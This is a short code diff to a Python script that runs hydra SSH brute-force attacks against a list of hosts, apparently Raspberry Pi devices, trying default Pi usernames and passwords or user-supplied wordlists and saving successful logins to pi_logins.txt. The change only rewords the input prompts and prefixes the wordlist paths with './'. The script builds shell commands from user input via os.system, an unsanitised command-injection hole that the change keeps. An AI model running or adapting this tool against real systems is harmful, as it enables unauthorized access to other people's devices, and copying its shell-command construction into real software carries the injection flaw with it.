@@ -51,9 +51,9 @@ def main():
         if default_credentials.lower() == "yes":
             os.system("hydra -L default_pi_username.txt -P default_pi_password.txt -M output.txt ssh -t 4 -s 22 -vV -o pi_logins.txt")
         else:
-            username_file = input("Please provide the path to the file containing the usernames: ")
-            password_file = input("Please provide the path to the file containing the passwords: ")
-            os.system(f"hydra -L {username_file} -P {password_file} -M output.txt ssh -t 4 -s 22 -vV -o pi_logins.txt")
+            username_file = input("Please provide the name of the username file: ")
+            password_file = input("Please provide the name of the password file: ")
+            os.system(f"hydra -L ./{username_file} -P ./{password_file} -M output.txt ssh -t 4 -s 22 -vV -o pi_logins.txt")
         print("Starting brute force attack...")
         # code to run brute force attack
     else:
